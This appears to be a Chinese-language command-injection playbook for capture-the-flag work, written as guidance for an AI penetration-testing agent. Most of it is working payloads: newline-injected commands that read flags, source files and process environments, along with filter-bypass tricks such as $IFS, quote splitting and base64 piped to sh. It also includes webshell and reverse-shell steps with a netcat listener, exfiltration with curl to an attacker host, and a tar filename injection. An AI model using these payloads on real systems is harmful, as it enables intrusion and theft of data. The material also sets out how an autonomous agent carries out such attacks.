...
- [upload insecure files](./upload-insecure-files.md) when the shell sink is part of a broader upload, import, or conversion workflow
...
> 融合自 wgpsec/AboutSecurity `command-injection-methodology`，与上文去重后仅保留独有内容。分隔符/上下文见上文 §1/§4；空格/slash/关键字/通配符绕过见上文 §6/§9；盲注决策树见上文 §8。

## 输出被过滤时的数据外泄（核心技巧）

**正则匹配伪造** —— 应用用正则提取 ping 结果（如匹配 `(\d+) packets transmitted`）时，构造符合正则的输出并嵌入数据：

```
ip_address=%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```

`%0a` 必须放在最前面（原命令无参数失败，只剩你的 echo 输出），不要在前面加 IP。

**读源码找过滤逻辑和路径**：

```
ip_address=%0aecho "$(cat /app/app.py) packets transmitted, ..."
ip_address=%0aecho "$(cat /Dockerfile) packets transmitted, ..."
```

**写文件到 Web 可访问路径**：

```
ip_address=127.0.0.1;cp /FLAG.txt /app/static/f.txt   → 访问 http://target/static/f.txt
```
...
**逐字符提取**：`cut -c N` / awk / substr 循环；条件盲注 `if [ $(cut -c1 /flag) = 'F' ]; then sleep 2; fi`。

## 系统性 Flag / 敏感文件搜索（固定路径失败必用）
...
%0als -la /   /   %0als -la /app/
%0aenv | grep -i flag
%0acat /proc/1/environ | tr '\0' | grep -i flag
%0acat /Dockerfile    ← 确认构建时拷贝的路径
```
...
```text
空格绕过:  type,C:\flag.txt        （逗号分隔）
变量绕过:  set a=who&&set b=ami&&%a%%b%
```

## 过滤绕过补充（与上文 §6/§9 不重复的项）

```bash
cat$IFS$9/flag              # $9 是空的位置参数
cat</flag   cat<>/etc/passwd # 输入/读写重定向代空格
c'a't /flag   c""at /flag   # 引号中断
/bin/c[a]t /flag            # 字符类
echo Y2F0IC9mbGFn | base64 -d | sh
$(printf '\x63\x61\x74') /etc/passwd   # printf hex
```

## RCE 后的交互策略（agent 执行规范）
...
| 🥈 | Webshell（写 php/jsp 文件，HTTP 交互） | Web 目标、有写权限 |
| 🥉 | HTTP 回传（`curl http://attacker/?d=$(cmd|base64)`） | 盲 RCE |
| 4 | 反弹 shell → `interactive_session` | 需持续交互（su/sudo/文件系统探索） |

确需反弹 shell 时用 `interactive_session` 工具：
...
4. interactive_session action="send"  session_name="listener" command="id"
5. interactive_session action="send"  session_name="listener" command="cat /flag.txt"
6. interactive_session action="close" session_name="listener"
```

**降级方案：Bash + tmux 手动交互**（interactive_session 不可用时）：

```bash
tmux new-session -d -s listener -x 200 -y 50 "nc -lvp 4444"   # 启动监听
tmux capture-pane -t listener -p -S -100                      # 读屏幕
tmux send-keys -t listener "id" Enter                         # 发命令
tmux send-keys -t listener C-c                                # 中断
tmux kill-session -t listener                                 # 收尾
```

核心三板斧 `new-session -d` / `send-keys` / `capture-pane -p` 适用于任何交互式程序：SSH、mysql、redis-cli、python REPL。

## CTF 技巧补充

**Tar 文件名注入**（服务器解压 tar 并显示文件名时，文件名元字符被执行）：

```bash
touch 'name; cat /flag #' && tar cf exploit.tar *
```

**正则缺 `$` 锚点绕过**：`preg_match('/^\d{1,3}\.…/ ', $ip)` 缺少 `$` 结尾锚点，追加命令即可：`127.0.0.1; cat /flag.txt`。
